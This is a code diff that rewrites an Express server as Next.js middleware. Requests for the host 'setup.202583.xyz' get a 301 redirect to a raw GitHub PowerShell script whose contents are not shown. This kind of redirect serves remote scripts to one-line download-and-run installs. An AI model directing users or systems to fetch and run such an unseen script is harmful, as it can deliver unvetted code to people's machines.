@@ -1,25 +1,18 @@
-import express, { Request, Response, NextFunction } from 'express';
+import { NextResponse } from 'next/server';
+import { NextRequest } from 'next/server';
 
-const app = express();
+export function middleware(req: NextRequest) {
+  const host = req.headers.get('host');
 
-// The target URL to redirect to
-const redirectUrl: string = 'https://raw.githubusercontent.com/rh609/setup/refs/heads/main/zawgers.ps1';
+  // Define the target URL to redirect to
+  const redirectUrl = 'https://raw.githubusercontent.com/rh609/setup/refs/heads/main/zawgers.ps1';
 
-// Middleware to check for the subdomain and redirect
-app.use((req: Request, res: Response, next: NextFunction) => {
-  const host: string = req.headers.host || '';
-
-  // Check if the request is for the specific subdomain
+  // Check if the request is from the specific subdomain
   if (host === 'setup.202583.xyz') {
-    // Redirect with 301 status code
-    return res.redirect(301, redirectUrl);
+    // Redirect with a 301 status code
+    return NextResponse.redirect(redirectUrl, 301);
   }
-  
-  // If the subdomain doesn't match, continue with the request
-  next();
-});
 
-// Start the server on port 80 (HTTP)
-app.listen(80, () => {
-  console.log('Server is running on http://setup.202583.xyz');
-});
+  // Continue with the request if the subdomain doesn't match
+  return NextResponse.next();
+}
